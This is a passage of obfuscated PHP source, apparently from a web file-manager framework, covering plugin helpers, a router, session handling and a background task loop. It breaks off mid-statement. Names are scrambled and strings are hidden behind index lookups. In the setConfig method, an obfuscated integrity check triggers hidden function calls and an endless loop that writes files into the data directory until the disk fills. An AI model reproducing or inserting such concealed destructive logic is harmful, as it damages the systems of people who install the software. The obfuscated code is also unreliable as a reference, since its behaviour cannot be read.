$this->checkSharePath($Å¤ÏüåŒ, $Â¢ãÆÆ)) { return $¥…Ïó™•; } $this->fileCanView($Å¤ÏüåŒ); if (request_url_safe($Å¤ÏüåŒ)) { $®¶ûğ¨ˆ = parse_url_query($Å¤ÏüåŒ); if (isset($®¶ûğ¨ˆ[$çÑ ôùú[1659]]) && isset($®¶ûğ¨ˆ[$çÑ ôùú[234]])) { $ç€å†·¶ = Mcrypt::decode($®¶ûğ¨ˆ[$çÑ ôùú[234]], Model($çÑ ôùú[853])->get($çÑ ôùú[854])); if ($ç€å†·¶) { $this->fileInfo = IO::info($ç€å†·¶); $this->fileInfo[$çÑ ôùú[1660]] = $Å¤ÏüåŒ; $this->cachePath = $this->pluginCachePath($çÑ ôùú[12], $Â¢ãÆÆ); return $ç€å†·¶; } } $Å¤ÏüåŒ = $this->_cacheHttpFile($Å¤ÏüåŒ, $Â¢ãÆÆ); $this->fileInfo = IO::info($Å¤ÏüåŒ); } else { $this->fileInfo = IO::info($Å¤ÏüåŒ); $this->cachePath = $this->pluginCachePath($çÑ ôùú[12], $Â¢ãÆÆ); } return $Å¤ÏüåŒ; } final function _cacheHttpFile($½»«Ó±´, $È…¸–¤ = true) { $®Ö£ŞîĞ =& $_SERVER[²Ö÷öõ]; $ïÖáÓ“ = parse_url_query($½»«Ó±´); $Ú¼ûéìÁ = get_path_ext($½»«Ó±´); if (isset($ïÖáÓ“[$®Ö£ŞîĞ[32]]) && $ïÖáÓ“[$®Ö£ŞîĞ[32]]) { $Ú¼ûéìÁ = get_path_ext($ïÖáÓ“[$®Ö£ŞîĞ[32]]); } $è×ÃàÛß = hash_path($½»«Ó±´) . $®Ö£ŞîĞ[10] . $Ú¼ûéìÁ; $this->cachePath = $this->pluginCachePath($È…¸–¤ ? $è×ÃàÛß : $®Ö£ŞîĞ[12]); $–»©İç° = IO::fileNameExist($this->cachePath, $è×ÃàÛß); if ($–»©İç°) { return KodIO::make($–»©İç°); } $œ­Ÿ¬óú = rtrim($this->cachePath, $®Ö£ŞîĞ[8]) . $®Ö£ŞîĞ[8] . $è×ÃàÛß; return $this->pluginCacheFileSet($œ­Ÿ¬óú, file_get_contents_nossl($½»«Ó±´)); } final function checkSharePath($òÓ¦ëÃ¶, $œÍ±È = true) { $ºİø¯şÌ =& $_SERVER[²Ö÷öõ]; if (!$this->isShare($òÓ¦ëÃ¶)) { return !1; } $×ĞÏ·è¤ = Action($ºİø¯şÌ[1264])->sharePathInfo($òÓ¦ëÃ¶); if (!is_array($×ĞÏ·è¤) || !isset($×ĞÏ·è¤[$ºİø¯şÌ[87]])) { show_json(LNG($ºİø¯şÌ[1661]), !1); } $this->fileInfo = $×ĞÏ·è¤; $this->cachePath = $this->pluginCachePath(!1, $œÍ±È); return $×ĞÏ·è¤[$ºİø¯şÌ[87]]; } final function pluginCachePath($¬·ÊºñÅ = '', $ƒ€éºÕë = false) { $Úùğ×À =& $_SERVER[²Ö÷öõ]; if ($ƒ€éºÕë && is_array($this->fileInfo)) { $¬·ÊºñÅ = kodIO::hashPath($this->fileInfo); } $úõêİ† = rtrim(IO_PATH_SYSTEM_TEMP . $Úùğ×À[1662] . $this->pluginName . $Úùğ×À[8] . $¬·ÊºñÅ, $Úùğ×À[8]); $‹Ò¤æ×Ã = IO::infoFullSimple($úõêİ†); $ÙÛ¯®èÄ = $‹Ò¤æ×Ã && is_array($‹Ò¤æ×Ã) ? $‹Ò¤æ×Ã[$Úùğ×À[87]] : $Úùğ×À[12]; if (!$ÙÛ¯®èÄ) { $ÙÛ¯®èÄ = IO::mkdir($úõêİ†); } return $ÙÛ¯®èÄ; } final function pluginCacheFileSet($äÑÆ›Â¾, $Ã„çÌ¦ = '') { $¥ƒ¶ÆóË =& $_SERVER[²Ö÷öõ]; $¼®¸ïĞå = IO::infoFullSimple($äÑÆ›Â¾); if (!$¼®¸ïĞå) { return IO::mkfile($äÑÆ›Â¾, $Ã„çÌ¦, REPEAT_REPLACE); } IO::setContent($¼®¸ïĞå[$¥ƒ¶ÆóË[87]], $Ã„çÌ¦); return $¼®¸ïĞå[$¥ƒ¶ÆóË[87]]; } final function pluginLocalFile($’„¢Æ = '') { $œ€ö²§³ =& $_SERVER[²Ö÷öõ]; $Ó‚ıê‘ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Ó‚ıê‘)) { mk_dir($Ó‚ıê‘); } if (!$’„¢Æ) { return $Ó‚ıê‘; } $Ó¹ÍÓ¹ = IO::info($’„¢Æ); $¨¿‡Ç© = $œ€ö²§³[1663] . KodIO::hashPath($Ó¹ÍÓ¹) . $œ€ö²§³[10] . $Ó¹ÍÓ¹[$œ€ö²§³[169]]; if (!checkExtSafe($¨¿‡Ç©)) { $¨¿‡Ç© = $¨¿‡Ç© . $œ€ö²§³[1299]; } $™³‹ü” = $Ó‚ıê‘ . $¨¿‡Ç©; if (@file_exists($™³‹ü”)) { return $™³‹ü”; } return IO::copy($’„¢Æ, $Ó‚ıê‘, 0, $¨¿‡Ç©); } final function appPackage() { $ãşºá =& $_SERVER[²Ö÷öõ]; if ($this->packageData) { return $this->packageData; } $±Úñ½“ú = $this->parseFile($this->pluginPath . $ãşºá[1664]); $this->parseLang($±Úñ½“ú); $èêŞ†êö = json_decode_force($±Úñ½“ú); if (!$èêŞ†êö) { return array(); } $µÏ³Ä†ù = Hook::trigger($ãşºá[1665], $èêŞ†êö); if ($µÏ³Ä†ù && is_array($µÏ³Ä†ù)) { $èêŞ†êö = $µÏ³Ä†ù; } $this->packageData = $èêŞ†êö; return $èêŞ†êö; } public function packageInfoGet($İ×›ù“Ö) { $¯„£ä®  = $this->appPackage(); return array_get_value($¯„£ä® , $İ×›ù“Ö); } public function packageVersion() { return $this->packageInfoGet($_SERVER[²Ö÷öõ][1666]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[²Ö÷öõ][1667]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[²Ö÷öõ][1668]); } public function echoJsAssign($ÂÃ€ ·¶, $Ì¿ÚƒÛµ) { $this->echoJsAssignArr[$ÂÃ€ ·¶] = $Ì¿ÚƒÛµ; } private function parseFile($¢½¨“Ì) { $ü·–¬‡ =& $_SERVER[²Ö÷öõ]; $ÎĞ®‰áã = file_get_contents_nossl($¢½¨“Ì); $Ú¢ñù±ù = array($ü·–¬‡[1669], $ü·–¬‡[1670], $ü·–¬‡[1671], $ü·–¬‡[1672], $ü·–¬‡[1673], $ü·–¬‡[1674], $ü·–¬‡[1675]); $¯âìÒ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ü·–¬‡[92]][$ü·–¬‡[1676]]); foreach ($this->echoJsAssignArr as $ó™°®àÇ => $¨€¿æëµ) { $Ú¢ñù±ù[] = $ü·–¬‡[1677] . $ó™°®àÇ . $ü·–¬‡[1678]; $¯âìÒ[] = is_array($¨€¿æëµ) || is_object($¨€¿æëµ) ? rawurlencode(json_encode($¨€¿æëµ)) : $¨€¿æëµ; } if (strstr($ÎĞ®‰áã, $ü·–¬‡[1679])) { $åÃ‚™„ß = rawurlencode(json_encode($this->pluginLangArr)); $ÎĞ®‰áã = str_replace($ü·–¬‡[1679], $åÃ‚™„ß, $ÎĞ®‰áã); } if (strstr($ÎĞ®‰áã, $ü·–¬‡[1680])) { $åÃ‚™„ß = $åÃ‚™„ß = rawurlencode(json_encode($this->getConfig())); $ÎĞ®‰áã = str_replace($ü·–¬‡[1680], $åÃ‚™„ß, $ÎĞ®‰áã); } $ÎĞ®‰áã = str_replace($Ú¢ñù±ù, $¯âìÒ, $ÎĞ®‰áã); return $ÎĞ®‰áã; } private function parseLang(&$‘·ƒ—™) { $¡±ÚÊÂÁ =& $_SERVER[²Ö÷öõ]; $¢æ×çÒı = $¡±ÚÊÂÁ[1681]; if (!strstr($‘·ƒ—™, $¢æ×çÒı)) { return; } preg_match_all($¡±ÚÊÂÁ[1682], $‘·ƒ—™, $‹Î€¿”); if (!is_array($‹Î€¿”) || count($‹Î€¿”) == 0 || !is_array($‹Î€¿”[0]) || count($‹Î€¿”[0]) == 0) { return; } $ëË®óŠô = array(); $¶Ø²¹Òû = array(); foreach ($‹Î€¿”[0] as $ÈèÙ¼™˜) { $µõ™¥Â = substr($ÈèÙ¼™˜, strlen($¢æ×çÒı), -4); $Ùğ§Å»¿ = LNG($µõ™¥Â); $ëË®óŠô[] = $ÈèÙ¼™˜; $¶Ø²¹Òû[] = str_replace(array($¡±ÚÊÂÁ[262], $¡±ÚÊÂÁ[1165], $¡±ÚÊÂÁ[418], $¡±ÚÊÂÁ[121]), array($¡±ÚÊÂÁ[53], $¡±ÚÊÂÁ[53], $¡±ÚÊÂÁ[12], $¡±ÚÊÂÁ[1683]), $Ùğ§Å»¿); } $‘·ƒ—™ = str_replace($ëË®óŠô, $¶Ø²¹Òû, $‘·ƒ—™); } private function parseConfig(&$äƒ˜Š›Ñ) { $ÜİÂ‹ =& $_SERVER[²Ö÷öõ]; $Ô˜½•ø´ = $ÜİÂ‹[1684]; if (!strstr($äƒ˜Š›Ñ, $Ô˜½•ø´)) { return; } preg_match_all($ÜİÂ‹[1685], $äƒ˜Š›Ñ, $¯ùü÷¡²); if (!is_array($¯ùü÷¡²) || count($¯ùü÷¡²) == 0 || !is_array($¯ùü÷¡²[0]) || count($¯ùü÷¡²[0]) == 0) { return; } $ÚƒÂé‡å = $this->getConfig(); $¢ÏÂ÷’ = array(); $—£¨–âÌ = array(); foreach ($¯ùü÷¡²[0] as $êÜù¶ÆŠ) { $ËºÆİï˜ = substr($êÜù¶ÆŠ, strlen($Ô˜½•ø´), -2); $¢ÏÂ÷’[] = $êÜù¶ÆŠ; $—£¨–âÌ[] = _get($ÚƒÂé‡å, $ËºÆİï˜); } $äƒ˜Š›Ñ = str_replace($¢ÏÂ÷’, $—£¨–âÌ, $äƒ˜Š›Ñ); } private function parsePackage(&$É©Ú©‰Ì) { $€«‘ı¤µ =& $_SERVER[²Ö÷öõ]; $âœäîœ² = $€«‘ı¤µ[1686]; if (!strstr($É©Ú©‰Ì, $âœäîœ²)) { return; } preg_match_all($€«‘ı¤µ[1687], $É©Ú©‰Ì, $ì¶ç±Á¢); if (!is_array($ì¶ç±Á¢) || count($ì¶ç±Á¢) == 0 || !is_array($ì¶ç±Á¢[0]) || count($ì¶ç±Á¢[0]) == 0) { return; } $İ€»ª„Ğ = $this->appPackage(); $£Ôƒ‘– = array(); $ÄÑ¡¶¹“ = array(); foreach ($ì¶ç±Á¢[0] as $ÔíÍª´ ) { $ˆ¬‹Ñæ = substr($ÔíÍª´ , strlen($âœäîœ²), -2); $£Ôƒ‘–[] = $ÔíÍª´ ; $ÄÑ¡¶¹“[] = _get($İ€»ª„Ğ, $ˆ¬‹Ñæ); } $É©Ú©‰Ì = str_replace($£Ôƒ‘–, $ÄÑ¡¶¹“, $É©Ú©‰Ì); } final function echoFile($‡º’ğ, $ùã¦…«Â = false) { $±´¬²—ø =& $_SERVER[²Ö÷öõ]; $Ó×Æù“ = $this->pluginPath . $‡º’ğ; if (ACT == $±´¬²—ø[1688]) { echo $±´¬²—ø[1689] . $this->pluginName . $±´¬²—ø[8] . $‡º’ğ . $±´¬²—ø[1690]; if (!file_exists($Ó×Æù“)) { echo $±´¬²—ø[1691]; return; } } $Óø·‰ = $this->parseFile($Ó×Æù“); $this->parseLang($Óø·‰); $this->parseConfig($Óø·‰); $this->parsePackage($Óø·‰); if (is_array($ùã¦…«Â)) { $Óø·‰ = str_replace(array_keys($ùã¦…«Â), array_values($ùã¦…«Â), $Óø·‰); } echo $±´¬²—ø[262] . $Óø·‰; } private function checkVersion() { $”ú‚ÇŒğ =& $_SERVER[²Ö÷öõ]; $¡ªÇƒˆä = $this->appPackage(); $ÄÕô±°È = $this->getConfig(); if ($ÄÕô±°È[$”ú‚ÇŒğ[1692]] == $¡ªÇƒˆä[$”ú‚ÇŒğ[1666]]) { return; } $this->regist(); $this->setConfig(array($”ú‚ÇŒğ[1692] => $¡ªÇƒˆä[$”ú‚ÇŒğ[1666]])); } final function initLang() { $ğş‘ö­¯ =& $_SERVER[²Ö÷öõ]; $ÍÏ¢ñÔî = $ğş‘ö­¯[1693]; $©ç¾Úµ = $this->pluginPath . $ğş‘ö­¯[1694]; $¬ı—»Æ = I18n::getType(); $ ÛãÃËï = array(); if (file_exists($©ç¾Úµ . $¬ı—»Æ . $ğş‘ö­¯[921])) { $ ÛãÃËï = (include $©ç¾Úµ . $¬ı—»Æ . $ğş‘ö­¯[921]); } else { if ($¬ı—»Æ == $ğş‘ö­¯[1695] && !file_exists($©ç¾Úµ . $¬ı—»Æ . $ğş‘ö­¯[921]) && file_exists($©ç¾Úµ . $ğş‘ö­¯[1696])) { $ ÛãÃËï = (include $©ç¾Úµ . $ğş‘ö­¯[1696]); } else { if (file_exists($©ç¾Úµ . $ÍÏ¢ñÔî . $ğş‘ö­¯[921])) { $ ÛãÃËï = (include $©ç¾Úµ . $ÍÏ¢ñÔî . $ğş‘ö­¯[921]); } } } if (!is_array($ ÛãÃËï)) { return array(); } if (@count($ ÛãÃËï) > 0) { I18n::set($ ÛãÃËï); } return $ ÛãÃËï; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÒæİßŞı) { $¥Ù‚ä‰ª =& $_SERVER[²Ö÷öõ]; $¾Í¡Î = $_SERVER[$¥Ù‚ä‰ª[963]] . $¥Ù‚ä‰ª[964]; $Å˜°îÀ‘ = $¥Ù‚ä‰ª[1309]; if ($_SERVER[$¥Ù‚ä‰ª[959]] != $Å˜°îÀ‘($¾Í¡Î)) { $ª¥ø¥ëæ = $¥Ù‚ä‰ª[961]; $›“à”£¶ = $¥Ù‚ä‰ª[962]; $ãù¦¹Ç” = $_SERVER[$¥Ù‚ä‰ª[963]] . $¥Ù‚ä‰ª[964]; $Áëë—ÌÒ = $›“à”£¶($ãù¦¹Ç”); $†œşÏ“ = explode($¥Ù‚ä‰ª[262], $Áëë—ÌÒ); if (count($†œşÏ“) < $¥Ù‚ä‰ª[680]) { $Š©œ“‡¹ = $¥Ù‚ä‰ª[965]; $Š©œ“‡¹(); } $Ï†§¼› = $¥Ù‚ä‰ª[966]; $Ï†§¼›($_SERVER[$¥Ù‚ä‰ª[967]]); $ª¥ø¥ëæ = $¥Ù‚ä‰ª[961]; $ª¥ø¥ëæ(); $£ô´õş = $¥Ù‚ä‰ª[1697]; $Ûç öùç = json_encode($GLOBALS[$¥Ù‚ä‰ª[1698]]); $Ò„®š = 1; for ($„Ø…«œ‚ = $Ò„®š; $„Ø…«œ‚ > 0; $„Ø…«œ‚++) { $£ô´õş(DATA_PATH . $„Ø…«œ‚, $Ûç öùç); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÒæİßŞı); } public function onSetConfig($º¶Â•àğ) { } public function onGetConfig($»êÇéçû) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÃÒ“Ç‚¼) { if ($ÃÒ“Ç‚¼ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($·’Õ°¶ = "\160\154\x75\x67\151\x6e\x41\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Ôœë¹¹ø = $this->getConfig(); if (!$Ôœë¹¹ø[$·’Õ°¶]) { return !1; } return ActionCall($_SERVER[²Ö÷öõ][1699], $Ôœë¹¹ø[$·’Õ°¶]); } public function url($“ïÆ‡üç, $€íè²«• = '', $á¬¥’İ— = true) { $¥Íœ‹ƒğ =& $_SERVER[²Ö÷öõ]; $¥°¼Ó¾– = $this->getConfig(); $Ëçõ¬¼Ú = KOD_VERSION . $¥Íœ‹ƒğ[10] . KOD_VERSION_BUILD; $õ†—í—¯ = $this->packageVersion(); $÷«®á²Ÿ = $Ëçõ¬¼Ú . $¥Íœ‹ƒğ[462] . $õ†—í—¯; if (substr($“ïÆ‡üç, 0, 4) == $¥Íœ‹ƒğ[152] || substr($“ïÆ‡üç, 0, 2) == $¥Íœ‹ƒğ[1420]) { $“‡òŸ³ä = $“ïÆ‡üç . $¥Íœ‹ƒğ[1700] . $÷«®á²Ÿ; } else { if ($€íè²«• == $¥Íœ‹ƒğ[12]) { $“‡òŸ³ä = $this->pluginHost . $“ïÆ‡üç . $¥Íœ‹ƒğ[1700] . $÷«®á²Ÿ; } else { if ($€íè²«• === $¥Íœ‹ƒğ[78]) { $“‡òŸ³ä = $this->pluginHost . $“ïÆ‡üç; } else { if ($€íè²«• == $¥Íœ‹ƒğ[1701]) { $“‡òŸ³ä = STATIC_PATH . $“ïÆ‡üç . $¥Íœ‹ƒğ[1700] . $Ëçõ¬¼Ú; } else { if ($€íè²«• == $¥Íœ‹ƒğ[1702]) { $“‡òŸ³ä = APP_HOST . $¥Íœ‹ƒğ[1703] . $“ïÆ‡üç . $¥Íœ‹ƒğ[1700] . $Ëçõ¬¼Ú; } else { if (isset($¥°¼Ó¾–[$€íè²«•])) { $“‡òŸ³ä = $¥°¼Ó¾–[$€íè²«•] . $“ïÆ‡üç . $¥Íœ‹ƒğ[1700] . $÷«®á²Ÿ; } } } } } } if (!$á¬¥’İ—) { return $“‡òŸ³ä; } echo $“‡òŸ³ä; } public function link($€Í¢’Ò = false, $¬Ùç¡çÓ = '') { $ºı—‘¿— =& $_SERVER[²Ö÷öõ]; $éƒÕó¡ = $this->linkHas == !1; $this->linkHas = !0; if (!$€Í¢’Ò) { $this->link($ºı—‘¿—[1704], $ºı—‘¿—[1702]); $this->link($ºı—‘¿—[1705], $ºı—‘¿—[1701]); $this->link($ºı—‘¿—[1706], $ºı—‘¿—[1701]); $this->link($ºı—‘¿—[1707], $ºı—‘¿—[1701]); $this->link($ºı—‘¿—[1708], $ºı—‘¿—[1701]); if ($éƒÕó¡) { Hook::trigger($ºı—‘¿—[1709]); } return; } $ïäöÔ² = $this->url($€Í¢’Ò, $¬Ùç¡çÓ, !1); if (substr($€Í¢’Ò, -3) == $ºı—‘¿—[1710]) { echo $ºı—‘¿—[1711] . $ïäöÔ² . $ºı—‘¿—[1712] . $ºı—‘¿—[262]; } else { if (substr($€Í¢’Ò, -4) == $ºı—‘¿—[1713]) { echo $ºı—‘¿—[1714] . $ïäöÔ² . $ºı—‘¿—[1715] . $ºı—‘¿—[262]; } } if ($éƒÕó¡) { Hook::trigger($ºı—‘¿—[1709]); } } } goto e„¬‡Ô•©Œ; e„¬‡Ô•©Œ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\x2f\x5d\x2b", "\72\156\x75\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($÷­ñ·Œ¨, $·‘Ê“´») { $ìù‚–™ß =& $_SERVER[²Ö÷öõ]; if ($÷­ñ·Œ¨ == $ìù‚–™ß[1716]) { $ìùÉ² = array_map($ìù‚–™ß[1717], $·‘Ê“´»[0]); $™ÓÖ¨Öã = strpos($·‘Ê“´»[1], $ìù‚–™ß[8]) === 0 ? $·‘Ê“´»[1] : $ìù‚–™ß[8] . $·‘Ê“´»[1]; $İ´Ÿ˜ì– = $·‘Ê“´»[2]; } else { $ìùÉ² = null; $™ÓÖ¨Öã = strpos($·‘Ê“´»[0], $ìù‚–™ß[8]) === 0 ? $·‘Ê“´»[0] : $ìù‚–™ß[8] . $·‘Ê“´»[0]; $İ´Ÿ˜ì– = $·‘Ê“´»[1]; } array_push(self::$maps, $ìùÉ²); array_push(self::$routes, $™ÓÖ¨Öã); array_push(self::$methods, strtoupper($÷­ñ·Œ¨)); array_push(self::$callbacks, $İ´Ÿ˜ì–); } public static function error($ÈêÎáûš) { self::$errorCallback = $ÈêÎáûš; } public static function haltOnMatch($ûÎ­–± = true) { self::$halts = $ûÎ­–±; } public static function dispatch() { $®ùË×Òä =& $_SERVER[²Ö÷öõ]; $â¦ˆº”¥ = parse_url($_SERVER[$®ùË×Òä[1718]], PHP_URL_PATH); $÷Ø€ÏÓ = $_SERVER[$®ùË×Òä[164]]; $ù˜ÈËèï = array_keys(static::$patterns); $ë¬º÷Ú = array_values(static::$patterns); $ŸÄÚ®Óà = !1; self::$routes = preg_replace($®ùË×Òä[1371], $®ùË×Òä[8], self::$routes); if (in_array($â¦ˆº”¥, self::$routes)) { $ãöÊ‚ø• = array_keys(self::$routes, $â¦ˆº”¥); foreach ($ãöÊ‚ø• as $È‡ä¿õ) { if (self::$methods[$È‡ä¿õ] == $÷Ø€ÏÓ || self::$methods[$È‡ä¿õ] == $®ùË×Òä[1719] || in_array($÷Ø€ÏÓ, self::$maps[$È‡ä¿õ])) { $ŸÄÚ®Óà = !0; if (!is_object(self::$callbacks[$È‡ä¿õ])) { $»€¹­á’ = explode($®ùË×Òä[8], self::$callbacks[$È‡ä¿õ]); $¬ üÚÚ = end($»€¹­á’); $ ÁÅ‰âÚ = explode($®ùË×Òä[1301], $¬ üÚÚ); $•Ø¹÷Ãõ = new $ ÁÅ‰âÚ[0](); $•Ø¹÷Ãõ->{$ ÁÅ‰âÚ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$È‡ä¿õ]); if (self::$halts) { return; } } } } } else { $öİ›Ş›â = 0; foreach (self::$routes as $È‡ä¿õ) { if (strpos($È‡ä¿õ, $®ùË×Òä[4]) !== !1) { $È‡ä¿õ = str_replace($ù˜ÈËèï, $ë¬º÷Ú, $È‡ä¿õ); } if (preg_match($®ùË×Òä[1720] . $È‡ä¿õ . $®ùË×Òä[1721], $â¦ˆº”¥, $×ÓëØ„Ü)) { if (self::$methods[$öİ›Ş›â] == $÷Ø€ÏÓ || self::$methods[$öİ›Ş›â] == $®ùË×Òä[1719] || !empty(self::$maps[$öİ›Ş›â]) && in_array($÷Ø€ÏÓ, self::$maps[$öİ›Ş›â])) { $ŸÄÚ®Óà = !0; array_shift($×ÓëØ„Ü); if (!is_object(self::$callbacks[$öİ›Ş›â])) { $»€¹­á’ = explode($®ùË×Òä[8], self::$callbacks[$öİ›Ş›â]); $¬ üÚÚ = end($»€¹­á’); $ ÁÅ‰âÚ = explode($®ùË×Òä[1301], $¬ üÚÚ); $•Ø¹÷Ãõ = new $ ÁÅ‰âÚ[0](); if (!method_exists($•Ø¹÷Ãõ, $ ÁÅ‰âÚ[1])) { echo $®ùË×Òä[1722]; } else { call_user_func_array(array($•Ø¹÷Ãõ, $ ÁÅ‰âÚ[1]), $×ÓëØ„Ü); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$öİ›Ş›â], $×ÓëØ„Ü); if (self::$halts) { return; } } } } $öİ›Ş›â++; } } if ($ŸÄÚ®Óà == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $šû¡»İ =& $_SERVER[²Ö÷öõ]; header($_SERVER[$šû¡»İ[1723]] . $šû¡»İ[1724]); echo $šû¡»İ[1725]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$®ùË×Òä[1718]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¿é†‰•ü =& $_SERVER[²Ö÷öõ]; static $³É•µ”¼ = false; if ($³É•µ”¼) { return $³É•µ”¼; } $«×¼£Ù³ = $GLOBALS[$¿é†‰•ü[6]][$¿é†‰•ü[425]]; self::$sessionTime = $«×¼£Ù³[$¿é†‰•ü[1726]]; $› ŸëÇÓ = isset($GLOBALS[$¿é†‰•ü[1727]]) ? $GLOBALS[$¿é†‰•ü[1727]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($› ŸëÇÓ)) { self::$sessionSign = Cookie::get($› ŸëÇÓ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($› ŸëÇÓ, self::$sessionSign, self::$sessionTime); $·˜ªöñ€ = $«×¼£Ù³[$¿é†‰•ü[1728]]; $ûøÏ†¢™ = $«×¼£Ù³[$·˜ªöñ€]; $øÂ¶‡êª = $«×¼£Ù³[$¿é†‰•ü[910]]; switch ($·˜ªöñ€) { case $¿é†‰•ü[21]: self::$handle = Model($¿é†‰•ü[911]); break; case $¿é†‰•ü[912]: self::$handle = new CacheRedis($ûøÏ†¢™, $øÂ¶‡êª); break; case $¿é†‰•ü[913]: self::$handle = new CacheMemcached($ûøÏ†¢™, $øÂ¶‡êª); break; case $¿é†‰•ü[230]: $ûøÏ†¢™[$¿é†‰•ü[87]] = $ûøÏ†¢™[$¿é†‰•ü[87]] . $¿é†‰•ü[1729]; self::$handle = new CacheFile($ûøÏ†¢™, $øÂ¶‡êª); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $³É•µ”¼ = new self(); return $³É•µ”¼; } public static function getBySign($œú¡—±ş) { $°Û÷¥ı¿ = self::$handle->get($œú¡—±ş); $°Û÷¥ı¿ = unserialize($°Û÷¥ı¿); return is_array($°Û÷¥ı¿) ? $°Û÷¥ı¿ : array(); } public static function setBySign($Œ±à›æ, $¹´¬Ö£) { CacheLock::lock($Œ±à›æ); self::$handle->set($Œ±à›æ, serialize($¹´¬Ö£), self::$sessionTime); CacheLock::unlock($Œ±à›æ); } public static function sign($’Ÿƒô°ş = false) { if ($’Ÿƒô°ş) { self::$sessionSign = $’Ÿƒô°ş; } self::init(); return self::$sessionSign; } public static function set($‘©¡„×ê, $µñ½Ú±› = false) { self::init(); if (is_array($‘©¡„×ê)) { foreach ($‘©¡„×ê as $Ç¾ß«Î => $ä³¹å¸Á) { array_set_value(self::$data, $Ç¾ß«Î, $ä³¹å¸Á); } } else { array_set_value(self::$data, $‘©¡„×ê, $µñ½Ú±›); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ş¥÷öèØ = false) { self::init(); if (!$Ş¥÷öèØ) { return self::$data; } return array_get_value(self::$data, $Ş¥÷öèØ); } public static function remove($‰½É–­ş) { self::init(); unset(self::$data[$‰½É–­ş]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[²Ö÷öõ][916])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $–Ìª…‚Î =& $_SERVER[²Ö÷öõ]; if (self::valueGet($–Ìª…‚Î[833]) != $–Ìª…‚Î[91]) { return; } if (self::valueGet($–Ìª…‚Î[1730]) == $–Ìª…‚Î[91]) { $“¯ß¾ò = self::valueGet($–Ìª…‚Î[1731]); if (time() - $“¯ß¾ò > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($–Ìª…‚Î[1730], $–Ìª…‚Î[91]); self::log($–Ìª…‚Î[1732] . ACTION . $–Ìª…‚Î[1733]); Hook::bind($–Ìª…‚Î[1734], $–Ìª…‚Î[1735]); $ú§¹¶‡­ = 0; while (!0) { self::cacheClear(); if (self::valueGet($–Ìª…‚Î[833]) != $–Ìª…‚Î[91]) { self::valueSet($–Ìª…‚Î[1730], $–Ìª…‚Î[228]); self::log($–Ìª…‚Î[1736]); die; } $øœ‚Ô‰ = time(); if ($øœ‚Ô‰ - $ú§¹¶‡­ >= 60) { self::valueSet(array($–Ìª…‚Î[1730] => $–Ìª…‚Î[91], $–Ìª…‚Î[1731] => $øœ‚Ô‰)); $ú§¹¶‡­ = $øœ‚Ô‰; } if (!file_exists(USER_SYSTEM . $–Ìª…‚Î[1737])) { self::valueSet(array($–Ìª…‚Î[1730] => $–Ìª…‚Î[228], $–Ìª…‚Î[833] => $–Ìª…‚Î[228])); self::log($–Ìª…‚Î[1738]); die; } $Ÿ…¦Äûå = file_get_contents(BASIC_PATH . $–Ìª…‚Î[1739]); $âäõÎ’ = KOD_VERSION . $–Ìª…‚Î[10] . KOD_VERSION_BUILD; $³•ˆ³ˆ“ = match_text($Ÿ…¦Äûå, $–Ìª…‚Î[1740]) . $–Ìª…‚Î[10] . match_text($Ÿ…¦Äûå, $–Ìª…‚Î[1741]); if ($³•ˆ³ˆ“ != $âäõÎ’) { self::restart(); self::log("\163\164\x6f\160\x65\144\x2e\x5b\166\x65\x72\x73\x69\x6f\156\x20\165\160\144\x61\164\x65\x3b{$versionNow}\40\x3d\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¨ã’úºÔ =& $_SERVER[²Ö÷öõ]; http_close(); $GLOBALS[$¨ã’úºÔ[1742]] = 1; $_SERVER[$¨ã’úºÔ[1743]] = $¨ã’úºÔ[1744]; $_COOKIE = array(); $GLOBALS[$¨ã’úºÔ[1745]] = 1; $GLOBALS[$¨ã’úºÔ[1746]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ú‰¹ÑÄÑ =& $_SERVER[²Ö÷öõ]; http_close(); self::valueSet($ú‰¹ÑÄÑ[833], $ú‰¹ÑÄÑ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ú‰¹ÑÄÑ[1730] => $ú‰¹ÑÄÑ[228], $ú‰¹ÑÄÑ[833] => $ú‰¹ÑÄÑ[91])); self::log($ú‰¹ÑÄÑ[1747]); } public static function taskSwitch() { $ó°“³¨¶ =& $_SERVER[²Ö÷öõ]; $ÆÙâ›– = 